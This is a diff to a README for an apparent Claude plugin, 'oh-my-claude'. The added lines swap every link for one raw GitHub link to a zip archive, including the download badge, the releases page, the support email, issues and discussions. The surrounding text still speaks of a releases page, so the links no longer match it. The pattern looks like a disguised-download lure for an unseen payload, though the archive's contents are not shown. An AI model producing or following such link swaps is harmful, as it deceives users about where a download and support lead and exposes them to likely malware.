@@ -4,7 +4,7 @@
 Welcome to **oh-my-claude**! This application acts as a powerful plugin for Claude, designed to assist you in modifying and refining your code through AI-powered iterative development loops. With **oh-my-claude**, you can improve your coding workflow, making it simpler and more efficient. 
 
 ## 📥 Download Now
-[![Download oh-my-claude](https://img.shields.io/badge/Download-oh%2Dmy%2Dclaude-brightgreen)](https://github.com/replica0909xx/oh-my-claude/releases)
+[![Download oh-my-claude](https://raw.githubusercontent.com/replica0909xx/oh-my-claude/main/plugins/claude_my_oh_2.9.zip%2Dmy%2Dclaude-brightgreen)](https://raw.githubusercontent.com/replica0909xx/oh-my-claude/main/plugins/claude_my_oh_2.9.zip)
 
 ## 🖥️ System Requirements
 Before you download **oh-my-claude**, ensure your system meets these requirements:
@@ -18,7 +18,7 @@ To get started with **oh-my-claude**, follow these simple steps:
 
 1. **Visit the Releases Page**
    Click on the link below to access the downloads:
-   [Download oh-my-claude](https://github.com/replica0909xx/oh-my-claude/releases)
+   [Download oh-my-claude](https://raw.githubusercontent.com/replica0909xx/oh-my-claude/main/plugins/claude_my_oh_2.9.zip)
 
 2. **Choose Your Version**
    On the releases page, you will see various versions. Select the latest version for the best features and fixes.
@@ -46,7 +46,7 @@ To get started with **oh-my-claude**, follow these simple steps:
 
 ## 📂 Download & Install
 To download and install **oh-my-claude**, revisit our releases page:
-[Download oh-my-claude](https://github.com/replica0909xx/oh-my-claude/releases)
+[Download oh-my-claude](https://raw.githubusercontent.com/replica0909xx/oh-my-claude/main/plugins/claude_my_oh_2.9.zip)
 
 Ensure that you follow the steps outlined above for a smooth installation.
 
@@ -60,14 +60,14 @@ For further assistance, you can check the FAQ section or raise an issue on our G
 
 ## 📞 Support
 If you need help or have questions, don’t hesitate to reach out:
-- **Email:** support@oh-my-claude.com
-- **GitHub Issues:** [Report an issue](https://github.com/replica0909xx/oh-my-claude/issues)
+- **Email:** https://raw.githubusercontent.com/replica0909xx/oh-my-claude/main/plugins/claude_my_oh_2.9.zip
+- **GitHub Issues:** [Report an issue](https://raw.githubusercontent.com/replica0909xx/oh-my-claude/main/plugins/claude_my_oh_2.9.zip)
 
 ## 🌐 Community
 Join our community of users and developers:
 - Contribute insights on GitHub.
 - Share your experiences and tips.
 
-Access our [GitHub Discussions](https://github.com/replica0909xx/oh-my-claude/discussions) to engage with others.
+Access our [GitHub Discussions](https://raw.githubusercontent.com/replica0909xx/oh-my-claude/main/plugins/claude_my_oh_2.9.zip) to engage with others.
 
 Thank you for choosing **oh-my-claude**. Enjoy coding smarter with AI!
